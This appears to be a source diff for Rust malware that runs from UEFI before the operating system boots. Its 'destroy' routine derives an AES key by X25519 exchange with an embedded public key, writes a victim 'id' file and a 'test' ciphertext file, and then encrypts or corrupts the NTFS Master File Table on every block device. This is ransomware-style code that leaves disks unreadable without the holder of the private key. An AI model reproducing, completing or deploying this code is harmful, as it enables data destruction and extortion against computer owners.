@@ -1,6 +1,4 @@
-use aes::cipher::{
-    generic_array::GenericArray, BlockEncrypt, NewBlockCipher,
-};
+use aes::cipher::{generic_array::GenericArray, BlockEncrypt, NewBlockCipher};
 use aes::{Aes256, Block};
 use alloc::vec;
 use alloc::vec::Vec;
@@ -223,7 +221,37 @@ fn beat_the_shit_out_of_the_mft(
     Ok(())
 }
 
+fn write_test_file(st: &SystemTable<Boot>, key_bytes: &[u8; 32]) -> uefi::Result {
+    let key = GenericArray::from_slice(key_bytes);
+    let cipher = Aes256::new(key);
+
+    let mut block = Block::default();
+    block.copy_from_slice(b"slava ukraini   ");
+
+    cipher.encrypt_block(&mut block);
+
+    write_file(st, "test", block.as_slice())?;
+
+    Ok(())
+}
+
 pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
+    let public_key_hex = include_str!("include/public_key.hex");
+    let mut buf = [0u8; 32];
+    hex::decode_to_slice(public_key_hex, &mut buf).unwrap();
+    let public_key = PublicKey::from(buf);
+
+    let rng = OsRng;
+    let secret = EphemeralSecret::new(rng);
+    let id = PublicKey::from(&secret);
+    let key = secret.diffie_hellman(&public_key);
+
+    let mut buf = [0u8; 64];
+    hex::encode_to_slice(id.as_bytes(), &mut buf).unwrap();
+    write_file(st, "id", &buf).unwrap();
+
+    write_test_file(st, key.as_bytes())?;
+
     // Get list of handles which instantiate a BlockIO
     let handles = st.boot_services().find_handles::<BlockIO>()?;
 
@@ -245,20 +273,6 @@ pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
         }
 
         if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
-            let public_key_hex = include_str!("include/public_key.hex");
-            let mut buf = [0u8; 32];
-            hex::decode_to_slice(public_key_hex, &mut buf).unwrap();
-            let public_key = PublicKey::from(buf);
-
-            let rng = OsRng;
-            let secret = EphemeralSecret::new(rng);
-            let id = PublicKey::from(&secret);
-            let key = secret.diffie_hellman(&public_key);
-
-            let mut buf = [0u8; 64];
-            hex::encode_to_slice(id.as_bytes(), &mut buf).unwrap();
-            write_file(st, "id", &buf).unwrap();
-
             beat_the_shit_out_of_the_mft(blk, media_id, ranges, key.to_bytes())?;
         }
     }
